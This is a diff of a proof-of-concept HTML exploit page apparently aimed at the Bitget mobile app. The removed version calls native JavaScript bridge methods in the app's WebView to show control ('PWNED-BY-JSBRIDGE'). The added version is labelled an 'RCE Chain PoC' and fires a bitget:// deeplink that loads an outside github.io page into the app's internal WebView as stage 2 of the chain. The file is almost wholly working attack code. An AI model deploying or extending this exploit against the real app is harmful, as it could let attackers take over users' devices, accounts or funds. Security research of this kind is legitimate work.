@@ -1,17 +1,13 @@
-<!DOCTYPE html><html><head><title>PoC v12 exec proof</title></head>
+<!DOCTYPE html><html><head><title>Bitget RCE Chain PoC</title></head>
 <body>
-<h2>PoC v12 exec proof</h2>
-<pre id="out">waiting 3s...</pre>
+<h2>Zero-adb attack chain</h2>
+<p id="st">Click stage2 to fire deeplink into Bitget internal WebView.</p>
+<button style="font-size:24px;padding:20px" onclick="fire()">STAGE 2: fire bitget:// deeplink</button>
 <script>
-function log(s){document.getElementById('out').textContent += "\n" + s;}
-setTimeout(function(){
-  if (!window.control) { log("NO control"); return; }
-  log("calling metaTitle (changes toolbar title)");
-  try { control.metaTitle("PWNED-BY-JSBRIDGE"); log("metaTitle OK"); } catch(e){ log("ERR metaTitle "+e); }
-  log("calling setNavigationBarHide...");
-  try { control.setNavigationBarHide("1"); log("snbh OK"); } catch(e){ log("ERR snbh "+e); }
-  log("now closing this Activity via navigationPopBack in 2s");
-  setTimeout(function(){ try { control.navigationPopBack(); log("npb OK"); } catch(e){ log("ERR npb "+e); } }, 2000);
-}, 3000);
+function fire(){
+  var u = "bitget://app.bitget.com/web/main/h5?url=" + encodeURIComponent("https://createnewdemo.github.io/bgjspoc/page2.html?v=zeroadb");
+  document.getElementById('st').textContent = "firing: " + u;
+  location.href = u;
+}
 </script>
 </body></html>
